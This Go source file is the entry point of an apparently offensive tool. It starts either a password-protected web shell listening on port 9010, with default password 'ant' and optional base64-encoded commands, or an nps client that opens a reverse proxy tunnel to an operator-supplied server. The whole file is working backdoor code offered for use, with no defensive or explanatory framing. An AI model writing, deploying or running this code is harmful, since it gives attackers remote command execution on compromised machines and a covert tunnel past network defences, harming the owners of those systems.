package main

import (
	"flag"
	"net/http"

	"github.com/Wd0g/GoShell/lib/server"

	"ehang.io/nps/client"
)

var (
	mode       = flag.String("m", "cmd", "[cmd, custom, npc]")
	webAddr    = flag.String("web-addr", "0.0.0.0:9010", "")
	webPwd     = flag.String("web-pwd", "ant", "")
	webDecoder = flag.String("web-decoder", "plain", "[plain, base64]")
	npcServer  = flag.String("server", "", "")
	npcVkey    = flag.String("vkey", "", "")
	npcType    = flag.String("type", "", "")
)

func main() {
	flag.Parse()

	switch *mode {
	case "npc":
		cli := client.NewRPClient(*npcServer, *npcVkey, *npcType, "", nil, 60)
		cli.Start()
	case "cmd":
		handler := server.Handler{
			Pwd:     *webPwd,
			Decoder: *webDecoder,
			Mode:    "cmd",
		}
		http.ListenAndServe(*webAddr, handler)
	case "custom":
		handler := server.Handler{
			Pwd:     *webPwd,
			Decoder: *webDecoder,
			Mode:    "custom",
		}
		http.ListenAndServe(*webAddr, handler)
	}
}
